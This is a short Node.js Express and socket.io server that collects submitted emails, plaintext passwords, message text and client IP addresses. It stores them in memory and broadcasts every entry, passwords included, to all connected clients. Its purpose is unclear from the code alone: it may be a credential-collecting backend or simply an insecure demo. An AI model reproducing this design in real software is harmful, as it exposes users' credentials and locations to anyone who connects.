const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

let messages = [];

io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

  socket.emit('load messages', messages);

  socket.on('send secret', (data) => {
    if (!data.text || data.text.trim() === '') return;

    const newMessage = {
      id: Date.now(),
      email: data.email ? data.email.trim() : 'Unknown',
      password: data.password ? data.password.trim() : 'N/A',
      text: data.text.trim(),
      ip: clientIp,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    messages.unshift(newMessage);
    io.emit('new secret', newMessage);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
